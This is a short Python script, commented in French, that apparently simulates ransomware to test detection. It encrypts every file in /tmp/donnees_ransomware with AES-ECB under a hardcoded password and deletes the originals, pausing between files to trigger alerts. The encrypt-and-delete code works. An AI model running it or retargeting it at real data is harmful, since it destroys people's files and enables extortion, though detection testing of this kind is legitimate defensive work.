"""
Script de simulation de Ransomware.
Parcourt tous les fichiers du dossier /tmp/donnees_ransomware, les chiffre 
un par un avec l'algorithme AES-ECB (dérivé d'un mot de passe), les renomme 
en .enc, puis supprime les fichiers originaux.
"""
import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import time 
dossier = "/tmp/donnees_ransomware"
os.makedirs(dossier, exist_ok=True) 
fichiers_a_chiffrer = []
with os.scandir(dossier) as fichiers:
    for f in fichiers:
        if f.is_file():
            fichiers_a_chiffrer.append(f.path)  
fichiers_chiffres = []
donnees = []
for f in fichiers_a_chiffrer:
    nom_sans_extension, extension = os.path.splitext(f)
    fichiers_chiffres.append(nom_sans_extension + ".enc")
    with open(f, "rb") as g:
        donnees.append(g.read())
def encrypt_file(password):
        cle_aes = hashlib.sha256(password.encode()).digest()
        # Chiffrement AES
        cipher = AES.new(cle_aes, AES.MODE_ECB)
        try:
            for i in range(len(fichiers_a_chiffrer)):
                donnees_chiffrees = cipher.encrypt(pad(donnees[i], AES.block_size))
                with open(fichiers_chiffres[i], "wb") as f:
                    f.write(donnees_chiffrees)
                os.remove(fichiers_a_chiffrer[i])
                time.sleep(2) # Pause pour simuler l'attaque et déclencher l'alerte
        except Exception as e:
            pass
encrypt_file("mot_de_passe_test") # à choisir
